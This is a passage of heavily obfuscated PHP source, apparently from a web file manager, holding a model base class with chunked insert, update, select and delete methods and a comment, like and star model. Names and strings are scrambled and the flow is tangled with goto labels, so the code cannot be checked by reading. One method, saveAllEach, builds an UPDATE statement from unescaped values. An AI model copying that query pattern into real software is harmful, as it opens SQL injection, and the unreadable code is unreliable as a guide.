"\x20\x45\116\x44\x20\40\127\110\105\122\x45\40{$C›ï˜Ù˜Å[0]}\40\111\x4e\x20\50{$bÓÓ†èÔ®÷}\51\x20"; $this->execute($aĞ™ÑÒÕê×); goto e–££ğ™êÖ; Aˆä°›õ×ö: $FÁŒ²º˜ = array(); goto Eñí•ˆÕ¡™; Eñí•ˆÕ¡™: } } goto EÈÂ‰æ§©; D™Í›‚…¿: $f¡§’‡ôÇ =& $_SERVER[œÕÊİğö]; $DêØ‘èì· = $this->tablePrefix . $this->tableName; $fŞÄ¿¬˜– = self::SQL_WHERE_IN_CHUNK; goto aÃóˆ¬´šÔ; aÃóˆ¬´šÔ: $Fœšìò— = is_array($Fœšìò—) ? $Fœšìò— : array(); $aĞ™ÑÒÕê× = $f¡§’‡ôÇ[251]; $A¶ã†Òğ®Ú = 0; goto fŒÌ…ƒ’ÎÆ; D‡ÄŒ˜²ÀÙ: } public function saveAllEach($a®ÈÅÓ…) { $f–Ó¥×İ¥Ô =& $_SERVER[œÕÊİğö]; $bÒ™ìÔ¥ÙÏ = $this->tablePrefix . $this->tableName; foreach ($a®ÈÅÓ… as $B“¨Ã­Èì) { if (!is_array($B“¨Ã­Èì) || count($B“¨Ã­Èì) != 4) { continue; } $Fã§‰„˜§¼ = $B“¨Ã­Èì[0] . $f–Ó¥×İ¥Ô[386] . $B“¨Ã­Èì[1] . $f–Ó¥×İ¥Ô[126]; $fÏÅ‚Ùš = $B“¨Ã­Èì[2] . $f–Ó¥×İ¥Ô[386] . $B“¨Ã­Èì[3] . $f–Ó¥×İ¥Ô[126]; $e§Œ™ÒÆÔ® = "\165\160\144\x61\x74\145\40{$bÒ™ìÔ¥ÙÏ}\x20\163\145\164\x20{$fÏÅ‚Ùš}\40\167\150\x65\x72\x65\x20{$Fã§‰„˜§¼}\73"; $this->execute($e§Œ™ÒÆÔ®); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($fË÷´®Çõ = false, $fïÚã‘èÑó = false) { $this->_chunkEvent = $fË÷´®Çõ; $this->_chunkEventParam = $fïÚã‘èÑó; } private function chunkEventCheck($fİøÁá÷Š) { if (!$this->_chunkEvent) { return; } $c•»ƒ‰çÆé = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $c•»ƒ‰çÆé[$_SERVER[œÕÊİğö][387]] = $fİøÁá÷Š; Hook::trigger($this->_chunkEvent, $c•»ƒ‰çÆé); } public function addAll($Døà—ÍöÙ, $Aƒ¦‚™‘ ” = array(), $f…¬À¯“‹‚ = false) { goto E›¬İÛ¬ì¾; eíÏá•‘Æ: if (method_exists($this->db, $f•¦ëŒÀÇ›[280])) { for ($CÆ¦§š½” = 0; $CÆ¦§š½” < count($Døà—ÍöÙ); $CÆ¦§š½” += $dòÍİ±èŸù) { $dù‚ëô¶Ç = array_slice($Døà—ÍöÙ, $CÆ¦§š½”, $dòÍİ±èŸù); if (!is_array($dù‚ëô¶Ç) || count($dù‚ëô¶Ç) == 0) { break; } $d”­ØëØš = $this->db->insertAll($dù‚ëô¶Ç, $Aƒ¦‚™‘ ”, $f…¬À¯“‹‚); $this->chunkEventCheck(count($dù‚ëô¶Ç)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Døà—ÍöÙ as $E¥«ö†¢Î™ => $fÖ„íÍ£ÊÏ) { $d”­ØëØš = $this->db->insert($fÖ„íÍ£ÊÏ, $Aƒ¦‚™‘ ”, $f…¬À¯“‹‚); } $this->commit(); } if (!1 !== $d”­ØëØš) { $B²’èÑ®ñë = $this->getLastInsID(); if ($B²’èÑ®ñë) { return $B²’èÑ®ñë; } } return $d”­ØëØš; goto DóÀ…§à; E›¬İÛ¬ì¾: $f•¦ëŒÀÇ› =& $_SERVER[œÕÊİğö]; ignore_timeout(); $dòÍİ±èŸù = self::SQL_WHERE_IN_CHUNK; goto b²Ç³®íî‹; b²Ç³®íî‹: if (empty($Døà—ÍöÙ)) { $this->error = think_lang($f•¦ëŒÀÇ›[279]); return !1; } $Aƒ¦‚™‘ ” = $this->_parseOptions($Aƒ¦‚™‘ ”); foreach ($Døà—ÍöÙ as $E¥«ö†¢Î™ => $fÖ„íÍ£ÊÏ) { $Døà—ÍöÙ[$E¥«ö†¢Î™] = $this->_facade($fÖ„íÍ£ÊÏ); $this->_beforeInsert($Døà—ÍöÙ[$E¥«ö†¢Î™], $Aƒ¦‚™‘ ”); } goto eíÏá•‘Æ; DóÀ…§à: } public function save($C¦ëÃ…„Ê = '', $DùºˆÃ½Ë = array()) { goto bÙÖˆÃ¡œë; Aô™ŠÒŠ˜¹: $Dƒ”Ú­‰Õ¬ = $Cñ²é¾×»Û[$eãÑ¤‘¢‹Ş[283]][$E½Ö×èğã][1]; $Dƒ”Ú­‰Õ¬ = is_array($Dƒ”Ú­‰Õ¬) ? $Dƒ”Ú­‰Õ¬ : array(); $cŒƒƒäÜä = count($Dƒ”Ú­‰Õ¬); goto FÃ‡É¹õ‹ì; FÃ‡É¹õ‹ì: for ($e´¿»íØ•ì = 0; $e´¿»íØ•ì < $cŒƒƒäÜä; $e´¿»íØ•ì += $FÖÇÄã“¢Š) { $D†²è²§‘ = array_slice($Dƒ”Ú­‰Õ¬, $e´¿»íØ•ì, $FÖÇÄã“¢Š); if (!is_array($D†²è²§‘) || count($D†²è²§‘) == 0) { break; } $Cñ²é¾×»Û[$eãÑ¤‘¢‹Ş[283]][$E½Ö×èğã][1] = $D†²è²§‘; $this->optionsValue($Cñ²é¾×»Û); $Eô¸¾”°²Ä += parent::save($C¦ëÃ…„Ê, $DùºˆÃ½Ë); $this->chunkEventCheck(count($D†²è²§‘)); } $this->chunkEventSet(); return $Eô¸¾”°²Ä; goto Cğ¢¼Ë×—’; fˆ³Ã¯¥Ñ: $E½Ö×èğã = $this->findWhereField($Cñ²é¾×»Û); if (!$E½Ö×èğã) { return parent::save($C¦ëÃ…„Ê, $DùºˆÃ½Ë); } $Eô¸¾”°²Ä = 0; goto Aô™ŠÒŠ˜¹; bÙÖˆÃ¡œë: $eãÑ¤‘¢‹Ş =& $_SERVER[œÕÊİğö]; $FÖÇÄã“¢Š = self::SQL_WHERE_IN_CHUNK; $Cñ²é¾×»Û = $this->optionsValue(); goto fˆ³Ã¯¥Ñ; Cğ¢¼Ë×—’: } public function add($f©Şñí¼ºò = '', $EîÆ©¶Ãƒ¯ = array(), $B¹Ññê»õ = false) { if ($this->addTaskStatus && is_array($f©Şñí¼ºò)) { $this->addTaskData[] = $f©Şñí¼ºò; return; } return parent::add($f©Şñí¼ºò, $EîÆ©¶Ãƒ¯, $B¹Ññê»õ); } public function parseWhereLike($F”ÈŠøÑŠ, $A–ÎÛ¾… = '', $c«òÄä‘ÀŠ = false, &$cŠÄ÷ºæ = false) { goto AÉÏ…·ŸÅ¦; fƒË„½ê: if (!is_array($F”ÈŠøÑŠ)) { return $F”ÈŠøÑŠ; } $aÊ³œôø¶ = array(); $C”ÉÎ§î² = 0; goto f¨ù‰ƒ…«; AÉÏ…·ŸÅ¦: $C³ï ÁØŒ£ =& $_SERVER[œÕÊİğö]; $c÷ÕÑ×ÆÏ = $GLOBALS[$C³ï ÁØŒ£[6]][$C³ï ÁØŒ£[388]]; if (!$c÷ÕÑ×ÆÏ[$C³ï ÁØŒ£[389]]) { return $F”ÈŠøÑŠ; } goto fƒË„½ê; f¨ù‰ƒ…«: foreach ($F”ÈŠøÑŠ as $cä°åŞ¦êä => $EÂâ›Â•º) { if (is_array($EÂâ›Â•º) && count($EÂâ›Â•º) == 2 && $EÂâ›Â•º[0] == $C³ï ÁØŒ£[390] && is_string($EÂâ›Â•º[1]) && substr($EÂâ›Â•º[1], 0, 1) == $C³ï ÁØŒ£[391] && substr($EÂâ›Â•º[1], strlen($EÂâ›Â•º[1]) - 1, 1) == $C³ï ÁØŒ£[391]) { goto b•Ê÷„‹Ùˆ; eÛØÜ×¾¨ª: $C’ĞïÇŠ°è = $this->db->escapeString($C’ĞïÇŠ°è); if (!strpos($A•íÙàÂØ, $C³ï ÁØŒ£[105])) { $A•íÙàÂØ = $C³ï ÁØŒ£[392] . $A•íÙàÂØ . $C³ï ÁØŒ£[392]; } $d±›õšÓÄè = $C³ï ÁØŒ£[192] . $C’ĞïÇŠ°è . $C³ï ÁØŒ£[192]; goto AšìÂíÆ„É; fŸ‡›ª¤ô¦: continue; goto BÙ¬ñ˜ßšÍ; b•Ê÷„‹Ùˆ: $cŠÄ÷ºæ = !0; $A•íÙàÂØ = is_string($cä°åŞ¦êä) ? $cä°åŞ¦êä : $A–ÎÛ¾…; $C’ĞïÇŠ°è = substr($EÂâ›Â•º[1], 1, strlen($EÂâ›Â•º[1]) - 2); goto eÛØÜ×¾¨ª; AšìÂíÆ„É: if ($c÷ÕÑ×ÆÏ[$C³ï ÁØŒ£[393]]) { $d±›õšÓÄè = $C³ï ÁØŒ£[394] . $C’ĞïÇŠ°è . $C³ï ÁØŒ£[395]; if ($c÷ÕÑ×ÆÏ[$C³ï ÁØŒ£[396]]) { $d±›õšÓÄè = $C³ï ÁØŒ£[395] . $C’ĞïÇŠ°è . $C³ï ÁØŒ£[394]; } } $aÊ³œôø¶[$C”ÉÎ§î²] = $C³ï ÁØŒ£[397] . $A•íÙàÂØ . $C³ï ÁØŒ£[398] . $d±›õšÓÄè . $C³ï ÁØŒ£[399]; $C”ÉÎ§î²++; goto fŸ‡›ª¤ô¦; BÙ¬ñ˜ßšÍ: } if (is_array($EÂâ›Â•º)) { $A–ÎÛ¾… = is_string($cä°åŞ¦êä) ? $cä°åŞ¦êä : $A–ÎÛ¾…; $EÂâ›Â•º = $this->parseWhereLike($EÂâ›Â•º, $A–ÎÛ¾…, !0, $cŠÄ÷ºæ); } if (is_numeric($cä°åŞ¦êä)) { $aÊ³œôø¶[$C”ÉÎ§î²] = $EÂâ›Â•º; $C”ÉÎ§î²++; } else { $aÊ³œôø¶[$cä°åŞ¦êä] = $EÂâ›Â•º; } } if ($cŠÄ÷ºæ && !$c«òÄä‘ÀŠ) { } return $aÊ³œôø¶; goto e›´•”‰Ï; e›´•”‰Ï: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($eÜ¤º„öñè = array()) { goto BÕ×«¬÷™; FÍ÷æÄç: return $DÃãåÕ›èò; goto bÖ‰Å­§àñ; BÕ×«¬÷™: $Bõ©Ê‹ëˆ =& $_SERVER[œÕÊİğö]; $eáãİéá© = self::SQL_WHERE_IN_CHUNK; $f×ãæâí‘± = $this->optionsValue(); goto D¯”ÚÄ–¼š; D¯”ÚÄ–¼š: $a¡©§—ª§É = $this->findWhereField($f×ãæâí‘±); if (!$a¡©§—ª§É || isset($f×ãæâí‘±[$Bõ©Ê‹ëˆ[300]]) || isset($f×ãæâí‘±[$Bõ©Ê‹ëˆ[361]])) { return parent::select($eÜ¤º„öñè); } $B·èºÕĞ¹ = $f×ãæâí‘±[$Bõ©Ê‹ëˆ[283]][$a¡©§—ª§É][1]; goto A†Û‘ÕğÔŒ; A†Û‘ÕğÔŒ: $B·èºÕĞ¹ = is_array($B·èºÕĞ¹) ? $B·èºÕĞ¹ : array(); $DÃãåÕ›èò = null; for ($e©Ï¶ºé¦À = 0; $e©Ï¶ºé¦À < count($B·èºÕĞ¹); $e©Ï¶ºé¦À += $eáãİéá©) { $D££ê’Ñ = array_slice($B·èºÕĞ¹, $e©Ï¶ºé¦À, $eáãİéá©); if (!is_array($D££ê’Ñ) || count($D££ê’Ñ) == 0) { break; } $f×ãæâí‘±[$Bõ©Ê‹ëˆ[283]][$a¡©§—ª§É][1] = $D££ê’Ñ; $this->optionsValue($f×ãæâí‘±); $bê‚ß¤ƒáá = parent::select($eÜ¤º„öñè); if (!$bê‚ß¤ƒáá) { continue; } $DÃãåÕ›èò = is_array($DÃãåÕ›èò) ? $DÃãåÕ›èò : array(); $DÃãåÕ›èò = array_merge($DÃãåÕ›èò, $bê‚ß¤ƒáá); } goto FÍ÷æÄç; bÖ‰Å­§àñ: } public function delete($BˆÓæÇŒöÅ = array()) { goto Fºº…èò«; Fºº…èò«: $f˜Óšªªœª =& $_SERVER[œÕÊİğö]; $e“ÁØÇ­¸£ = self::SQL_WHERE_IN_CHUNK; $E”­ôä³áè = $this->optionsValue(); goto F÷¥Ï¿Ô—º; f¥±¸Ğ‡±: return $F‘İËéš¸š; goto E¹ğ´áèÇ; F÷¥Ï¿Ô—º: $eÙÍ·ªßÂŞ = $this->findWhereField($E”­ôä³áè); if (!$eÙÍ·ªßÂŞ) { return parent::delete($BˆÓæÇŒöÅ); } $F‘İËéš¸š = 0; goto BòÚÈ‚£³¨; BòÚÈ‚£³¨: $dƒõ‡Ï°İš = $E”­ôä³áè[$f˜Óšªªœª[283]][$eÙÍ·ªßÂŞ][1]; $dƒõ‡Ï°İš = is_array($dƒõ‡Ï°İš) ? $dƒõ‡Ï°İš : array(); for ($D´¯©©…ì = 0; $D´¯©©…ì < count($dƒõ‡Ï°İš); $D´¯©©…ì += $e“ÁØÇ­¸£) { $Aš©”èö–» = array_slice($dƒõ‡Ï°İš, $D´¯©©…ì, $e“ÁØÇ­¸£); if (!is_array($Aš©”èö–») || count($Aš©”èö–») == 0) { break; } $E”­ôä³áè[$f˜Óšªªœª[283]][$eÙÍ·ªßÂŞ][1] = $Aš©”èö–»; $this->optionsValue($E”­ôä³áè); $F‘İËéš¸š += parent::delete($BˆÓæÇŒöÅ); } goto f¥±¸Ğ‡±; E¹ğ´áèÇ: } private function findWhereField($a­Ë­®öœ) { $Eóµ“ĞøÔ¬ =& $_SERVER[œÕÊİğö]; $eËÅ‘¹‚²Ä = self::SQL_WHERE_IN_CHUNK; if (!is_array($a­Ë­®öœ) || !is_array($a­Ë­®öœ[$Eóµ“ĞøÔ¬[283]])) { return !1; } foreach ($a­Ë­®öœ[$Eóµ“ĞøÔ¬[283]] as $d„ƒÃ· Õ¤ => $C¤àâ…ŒÉ‘) { if (is_array($C¤àâ…ŒÉ‘) && isset($C¤àâ…ŒÉ‘[0]) && is_string($C¤àâ…ŒÉ‘[0]) && strtolower($C¤àâ…ŒÉ‘[0]) == $Eóµ“ĞøÔ¬[7] && is_array($C¤àâ…ŒÉ‘[1]) && count($C¤àâ…ŒÉ‘[1]) > $eËÅ‘¹‚²Ä) { ignore_timeout(); return $d„ƒÃ· Õ¤; } } return !1; } public function setMasterDB($Bà§«±… Ã = true) { think_config($_SERVER[œÕÊİğö][400], $Bà§«±… Ã); } } goto c¦¢ïÉô„ä; A­¤ˆ’ç„Î: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\155\145\156\x74"; protected $tableMeta = array("\x74\141\142\x6c\x65\116\141\x6d\145" => "\143\x6f\155\155\x65\156\164\137\155\145\x74\141", "\x6d\x65\x74\141\x46\x69\145\154\144" => "\143\157\x6d\x6d\145\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($FÔàÓªíÛ’) { $D¸ë›ˆ”©Ñ =& $_SERVER[œÕÊİğö]; if ($FÔàÓªíÛ’[$D¸ë›ˆ”©Ñ[1748]]) { $bÂÎŒÕù¾– = $this->where(array($D¸ë›ˆ”©Ñ[1749] => $FÔàÓªíÛ’[$D¸ë›ˆ”©Ñ[1748]]))->find(); if (!$bÂÎŒÕù¾– || $bÂÎŒÕù¾–[$D¸ë›ˆ”©Ñ[415]] != $FÔàÓªíÛ’[$D¸ë›ˆ”©Ñ[415]] || $bÂÎŒÕù¾–[$D¸ë›ˆ”©Ñ[507]] != $FÔàÓªíÛ’[$D¸ë›ˆ”©Ñ[507]]) { return !1; } $this->where(array($D¸ë›ˆ”©Ñ[1749] => $FÔàÓªíÛ’[$D¸ë›ˆ”©Ñ[1748]]))->setAdd($D¸ë›ˆ”©Ñ[1750], 1); } $FÔàÓªíÛ’[$D¸ë›ˆ”©Ñ[1751]] = 0; $FÔàÓªíÛ’[$D¸ë›ˆ”©Ñ[1750]] = 0; $FÔàÓªíÛ’[$D¸ë›ˆ”©Ñ[740]] = 1; return $this->add($FÔàÓªíÛ’); } public function commentCount($fçÈÃÑ·”Ò, $Bº·ä½°, $bÕ±é¦¤Â = false) { goto eéí”ï; dö£‘øÕÍÒ: $c¥¥ò„í“” = array($bØÔ‡‚á´¨[507], $bØÔ‡‚á´¨[1752] => $bØÔ‡‚á´¨[503]); $CĞÔ–÷µğå = array($bØÔ‡‚á´¨[507] => array($bØÔ‡‚á´¨[7], $fçÈÃÑ·”Ò), $bØÔ‡‚á´¨[415] => $Bº·ä½°); if ($bÕ±é¦¤Â) { $CĞÔ–÷µğå[$bØÔ‡‚á´¨[1551]] = $bÕ±é¦¤Â; } goto e¥æêÁ®›„; eéí”ï: $bØÔ‡‚á´¨ =& $_SERVER[œÕÊİğö]; if (!$fçÈÃÑ·”Ò) { return array(); } if (is_string($fçÈÃÑ·”Ò) || is_int($fçÈÃÑ·”Ò)) { $fçÈÃÑ·”Ò = array($fçÈÃÑ·”Ò); } goto dö£‘øÕÍÒ; e¥æêÁ®›„: $a…Õ£™áç¸ = $this->field($c¥¥ò„í“”)->where($CĞÔ–÷µğå)->group($bØÔ‡‚á´¨[507])->select(); return array_to_keyvalue($a…Õ£™áç¸, $bØÔ‡‚á´¨[507], $bØÔ‡‚á´¨[503]); goto E•Œ²³¤ƒ„; E•Œ²³¤ƒ„: } public function starTarget($Bô“İ¡¯’, $CÀŒ‚•Àêï) { goto båŠ¿¿ƒ¦§; Aá¨“Ÿö: return $this->add($a¶Š²ƒÚ¼); goto E³¬İáÒçÜ; F½—«‚: $Bé÷ã’šÓ­ = $this->where($b½Ù¥·ˆ‚)->find(); if ($Bé÷ã’šÓ­) { return $this->where(array($DôŠùøĞĞŞ[404] => $Bé÷ã’šÓ­[$DôŠùøĞĞŞ[404]]))->delete(); } $a¶Š²ƒÚ¼ = array($DôŠùøĞĞŞ[1748] => 0, $DôŠùøĞĞŞ[1551] => USER_ID, $DôŠùøĞĞŞ[740] => 1, $DôŠùøĞĞŞ[745] => $DôŠùøĞĞŞ[43], $DôŠùøĞĞŞ[415] => $Dà‰®è»Ì, $DôŠùøĞĞŞ[507] => $CÀŒ‚•Àêï, $DôŠùøĞĞŞ[1751] => 0, $DôŠùøĞĞŞ[1750] => 0); goto Aá¨“Ÿö; båŠ¿¿ƒ¦§: $DôŠùøĞĞŞ =& $_SERVER[œÕÊİğö]; $Dà‰®è»Ì = $Bô“İ¡¯’ + self::TYPE_STAR_OFFSET; $b½Ù¥·ˆ‚ = array($DôŠùøĞĞŞ[1551] => USER_ID, $DôŠùøĞĞŞ[415] => $Dà‰®è»Ì, $DôŠùøĞĞŞ[507] => $CÀŒ‚•Àêï); goto F½—«‚; E³¬İáÒçÜ: } public function starTargetCount($aó«°í–›¸, $dŸªòè¨¿Ñ) { $CÏİœ‰×íÎ =& $_SERVER[œÕÊİğö]; $AÃßº°Ûä = $dŸªòè¨¿Ñ + self::TYPE_STAR_OFFSET; $e—èé«£Åö = $this->commentCount($aó«°í–›¸, $AÃßº°Ûä); $eİ£¬ƒ…ê = $this->commentCount($aó«°í–›¸, $AÃßº°Ûä, USER_ID); return array($CÏİœ‰×íÎ[1753] => $e—èé«£Åö, $CÏİœ‰×íÎ[1754] => $eİ£¬ƒ…ê); } public function starTargetUserList($EöÔÑ©êš, $cÚé¦åĞ½®) { goto fóßÏ‡ÀÉ; fóßÏ‡ÀÉ: $fàÒ‡¦ÁÙ½ =& $_SERVER[œÕÊİğö]; $DÔˆß‘·±‡ = $EöÔÑ©êš + self::TYPE_STAR_OFFSET; $aÇëğÌáî­ = array($fàÒ‡¦ÁÙ½[507] => $cÚé¦åĞ½®, $fàÒ‡¦ÁÙ½[415] => $DÔˆß‘·±‡); goto D‹¦¸‹¥ß; D‹¦¸‹¥ß: $eÊ¦µÇ˜ù = $this->where($aÇëğÌáî­)->count(); $B¾½çóáî = array($fàÒ‡¦ÁÙ½[263] => $eÊ¦µÇ˜ù, $fàÒ‡¦ÁÙ½[1755] => array()); if (!$eÊ¦µÇ˜ù) { return $B¾½çóáî; } goto aäö’Ğ¬ø±; dÚ”â¦‘ŞÄ: return $B¾½çóáî; goto aÔÉï¼Íù; aäö’Ğ¬ø±: $A’Æ×Ø‰¤° = $this->field($fàÒ‡¦ÁÙ½[1551])->where($aÇëğÌáî­)->limit(500)->select(); $A’Æ×Ø‰¤° = array_to_keyvalue($A’Æ×Ø‰¤°, $fàÒ‡¦ÁÙ½[43], $fàÒ‡¦ÁÙ½[1551]); $B¾½çóáî[$fàÒ‡¦ÁÙ½[1755]] = Model($fàÒ‡¦ÁÙ½[516])->userListInfo($A’Æ×Ø‰¤°); goto dÚ”â¦‘ŞÄ; aÔÉï¼Íù: } public function prasiseUserList($d×Âí¼§Úì) { goto EÁ§ôáóÒ; aâ™Œæäˆ: return $C²¨“Ÿ ; goto aÛ‰Œ…”ÙÀ; Bˆ¥áê§è: $C„åñ˜÷É = Model($EÍ‹Ú‚ğŠœ[1757])->field($EÍ‹Ú‚ğŠœ[1551])->where($d§²‹‹Ë±±)->limit(500)->select(); $C„åñ˜÷É = array_to_keyvalue($C„åñ˜÷É, $EÍ‹Ú‚ğŠœ[43], $EÍ‹Ú‚ğŠœ[1551]); $C²¨“Ÿ [$EÍ‹Ú‚ğŠœ[1755]] = Model($EÍ‹Ú‚ğŠœ[516])->userListInfo($C„åñ˜÷É); goto aâ™Œæäˆ; dÆ„¦œ÷—¿: $d‡Ò‰…×ÃÍ = _get($dÈ£¾ªÒô÷, $EÍ‹Ú‚ğŠœ[1751], 0); $C²¨“Ÿ  = array($EÍ‹Ú‚ğŠœ[263] => $d‡Ò‰…×ÃÍ, $EÍ‹Ú‚ğŠœ[1755] => array()); if (!$d‡Ò‰…×ÃÍ) { return $C²¨“Ÿ ; } goto Bˆ¥áê§è; EÁ§ôáóÒ: $EÍ‹Ú‚ğŠœ =& $_SERVER[œÕÊİğö]; $d§²‹‹Ë±± = array($EÍ‹Ú‚ğŠœ[1756] => $d×Âí¼§Úì); $dÈ£¾ªÒô÷ = $this->where($d§²‹‹Ë±±)->find(); goto dÆ„¦œ÷—¿; aÛ‰Œ…”ÙÀ: } public function remove($CïÊ‹Ÿ”Ø) { $D›„×Î²Èƒ =& $_SERVER[œÕÊİğö]; $CÃôƒ™ÃÅÍ = array($D›„×Î²Èƒ[1749] => $CïÊ‹Ÿ”Ø); $FÓ¼ùÛ¡Å  = $this->where($CÃôƒ™ÃÅÍ)->find(); if ($FÓ¼ùÛ¡Å [$D›„×Î²Èƒ[1748]]) { $this->where(array($D›„×Î²Èƒ[1749] => $FÓ¼ùÛ¡Å [$D›„×Î²Èƒ[1748]]))->setAdd($D›„×Î²Èƒ[1750], -1); } return $this->where($CÃôƒ™ÃÅÍ)->delete(); } public function edit($cè‚Ï¥Ñê, $BÛ¢óÂÂ¿İ) { $c§ë¾ŸœŠ¬ =& $_SERVER[œÕÊİğö]; $EÜâÈŞƒ³Ë = array($c§ë¾ŸœŠ¬[1749] => $cè‚Ï¥Ñê); return $this->where($EÜâÈŞƒ³Ë)->save(array($c§ë¾ŸœŠ¬[1758] => $BÛ¢óÂÂ¿İ)); } public function prasise($dë±êÃç¼á) { $dÌ…ŠŒ‡ÙÎ =& $_SERVER[œÕÊİğö]; $cÏœ¢Ñà’… = Model($dÌ…ŠŒ‡ÙÎ[1759]); $Féš²„ÆÜ = array($dÌ…ŠŒ‡ÙÎ[1749] => $dë±êÃç¼á, $dÌ…ŠŒ‡ÙÎ[1542] => USER_ID); $cá£–Öœ¦Í = $cÏœ¢Ñà’…->where($Féš²„ÆÜ)->find(); if (!$cá£–Öœ¦Í) { $cÏœ¢Ñà’…->add($Féš²„ÆÜ); $c‘†æ‡˜éŸ = $this->where(array($dÌ…ŠŒ‡ÙÎ[1749] => $dë±êÃç¼á))->setAdd($dÌ…ŠŒ‡ÙÎ[1751], 1); } else { $cÏœ¢Ñà’…->where($Féš²„ÆÜ)->delete(); $c‘†æ‡˜éŸ = $this->where(array($dÌ…ŠŒ‡ÙÎ[1749] => $dë±êÃç¼á))->setAdd($dÌ…ŠŒ‡ÙÎ[1751], -1); } return $c‘†æ‡˜éŸ; } public function targetInfo($CšÂßà’‚ñ, $c§îˆÜ¡ÕÃ) { goto aªê«ì™ãÃ; d†­È“–ÅÛ: return $a¦µˆÙàØƒ; goto A ‚†‘¦®; aªê«ì™ãÃ: $dºœ«ÎÀ¿ˆ =& $_SERVER[œÕÊİğö]; $bœ¿­ = array($dºœ«ÎÀ¿ˆ[583] => $CšÂßà’‚ñ, $dºœ«ÎÀ¿ˆ[584] => $c§îˆÜ¡ÕÃ); $eœò“ªæ = $this->where($bœ¿­)->count(); goto B„ˆˆ­Ó¬‹; B„ˆˆ­Ó¬‹: $Fè…½Æöªó = "\x52\x49\107\110\124\40\x4a\x4f\x49\116\x20{$this->tablePrefix}\143\x6f\x6d\x6d\145\x6e\x74\137\x70\162\141\151\163\145\x20\163\x74\x61\162\40\157\156\40\143\157\155\x6d\145\156\164\x2e\x63\x6f\155\x6d\x65\156\164\x49\x44\40\75\40\163\164\x61\x72\56\143\x6f\155\x6d\145\x6e\x74\111\x44"; $eŠÜØ–¬ÉÍ = $this->alias($dºœ«ÎÀ¿ˆ[362])->where($bœ¿­)->join($Fè…½Æöªó, $dºœ«ÎÀ¿ˆ[1760])->count(); $a¦µˆÙàØƒ = array($dºœ«ÎÀ¿ˆ[1761] => $eœò“ªæ, $dºœ«ÎÀ¿ˆ[1762] => $eŠÜØ–¬ÉÍ); goto d†­È“–ÅÛ; A ‚†‘¦®: } public function listData($b‹ŞÎÊÁæ¦) { $EíŒ„˜ÊÄ” =& $_SERVER[œÕÊİğö]; if (isset($b‹ŞÎÊÁæ¦[$EíŒ„˜ÊÄ”[1763]])) { if ($b‹ŞÎÊÁæ¦[$EíŒ„˜ÊÄ”[1763]]) { $b‹ŞÎÊÁæ¦[$EíŒ„˜ÊÄ”[1756]] = array($EíŒ„˜ÊÄ”[995], intval($b‹ŞÎÊÁæ¦[$EíŒ„˜ÊÄ”[1763]])); } unset($b‹ŞÎÊÁæ¦[$EíŒ„˜ÊÄ”[1763]]); } if (isset($b‹ŞÎÊÁæ¦[$EíŒ„˜ÊÄ”[1764]])) { if ($b‹ŞÎÊÁæ¦[$EíŒ„˜ÊÄ”[1764]]) { $b‹ŞÎÊÁæ¦[$EíŒ„˜ÊÄ”[1756]] = array($EíŒ„˜ÊÄ”[992], intval($b‹ŞÎÊÁæ¦[$EíŒ„˜ÊÄ”[1764]])); } unset($b‹ŞÎÊÁæ¦[$EíŒ„˜ÊÄ”[1764]]); } return $this->_listData($b‹ŞÎÊÁæ¦); } private function _listData($bŒòÀƒ¡) { $AÄÑ©âÃÌ =& $_SERVER[œÕÊİğö]; $b¡«ò†ö = $this->where($bŒòÀƒ¡)->_makeOrder()->selectPage(100); $this->_listAppendParent($b¡«ò†ö[$AÄÑ©âÃÌ[377]]); $this->_listAppendUser($b¡«ò†ö[$AÄÑ©âÃÌ[377]]); $this->_listAppendMeta($b¡«ò†ö[$AÄÑ©âÃÌ[377]]); return $b¡«ò†ö; } private function _makeOrder() { $fá‡Í­ÑÛù =& $_SERVER[œÕÊİğö]; $a³»¶õÍÂ = array($fá‡Í­ÑÛù[1751], $fá‡Í­ÑÛù[1750], $fá‡Í­ÑÛù[204]); $Aãîí¦å¦— = Input::get($fá‡Í­ÑÛù[458], $fá‡Í­ÑÛù[7], $fá‡Í­ÑÛù[427], $a³»¶õÍÂ); $dÕŞ¸¸„‚ = Input::get($fá‡Í­ÑÛù[459], $fá‡Í­ÑÛù[7], $fá‡Í­ÑÛù[1544], array($fá‡Í­ÑÛù[1765], $fá‡Í­ÑÛù[454])); $e«¡ïù²® = $Aãîí¦å¦— . $fá‡Í­ÑÛù[60] . $dÕŞ¸¸„‚; return $this->order($e«¡ïù²®); } private function _listAppendParent(&$aÎ·¬«‡š) { goto eåâÕ¤¾; e¦¯‘Éé÷: if (!$då‹–…©Òò) { return; } $aš¤š¨ÂíÌ = $this->where(array($F»™¿±Å¯š[1749] => array($F»™¿±Å¯š[7], $då‹–…©Òò)))->select(); $aš¤š¨ÂíÌ = array_to_keyvalue($aš¤š¨ÂíÌ, $F»™¿±Å¯š[1756]); goto c­šÜæÌ¨; eåâÕ¤¾: $F»™¿±Å¯š =& $_SERVER[œÕÊİğö]; $då‹–…©Òò = array_unique(array_to_keyvalue($aÎ·¬«‡š, $F»™¿±Å¯š[43], $F»™¿±Å¯š[1748])); $då‹–…©Òò = array_remove_value($då‹–…©Òò, $F»™¿±Å¯š[201]); goto e¦¯‘Éé÷; c­šÜæÌ¨: foreach ($aÎ·¬«‡š as &$D¤¿â”ß ƒ) { if (isset($aš¤š¨ÂíÌ[$D¤¿â”ß ƒ[$F»™¿±Å¯š[1748]]])) { $D¤¿â”ß ƒ[$F»™¿±Å¯š[1766]] = $aš¤š¨ÂíÌ[$D¤¿â”ß ƒ[$F»™¿±Å¯š[1748]]]; } } unset($D¤¿â”ß ƒ); goto AâŠÓ‚Õ¡‡; AâŠÓ‚Õ¡‡: } private function _listAppendUser(&$CËòê±äùæ) { goto d½ä°­ÂÜÆ; dµÊˆ àöÔ: foreach ($CËòê±äùæ as 